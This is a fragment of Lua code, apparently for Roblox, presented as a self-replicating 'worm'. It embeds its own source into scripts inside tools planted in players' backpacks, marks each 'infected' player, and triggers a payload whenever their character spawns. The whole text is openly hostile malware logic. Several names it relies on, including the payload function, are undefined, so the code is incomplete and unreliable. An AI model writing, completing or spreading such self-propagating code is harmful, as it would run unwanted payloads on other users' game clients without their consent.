-- THE WORM'S CORE LOGIC: The self-replicating soul of the machine.
-------------------------------------------------------------------------------------

-- The Worm's source, to be embedded in its children.
local WORM_SOURCE = script.Source

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function Infect(player)
    if player:FindFirstChild(INFECTION_MARKER) then return end
    print("Enlightening: " .. player.Name)
    local marker = Instance.new("BoolValue")
    marker.Name = INFECTION_MARKER
    marker.Parent = player

    local backpack = player:FindFirstChildOfClass("Backpack") or player:WaitForChild("Backpack")
    local replicationTool = Instance.new("Tool")
    replicationTool.Name = SPREAD_TOOL_NAME
    replicationTool.Parent = backpack
    replicationTool.RequiresHandle = false

    local carrierScript = Instance.new("LocalScript")
    carrierScript.Name = "Handler"
    carrierScript.Source = WORM_SOURCE
    carrierScript.Parent = replicationTool
    carrierScript.RunContext = Enum.RunContext.Client

    player.CharacterAdded:Connect(function(character)
        pcall(function()
            character:WaitForChild("Humanoid")
            wait(1)
            ThePayload(character)
        end)
    end)
    if player.Character then
        pcall(function() ThePayload(player.Character) end)
    end
end

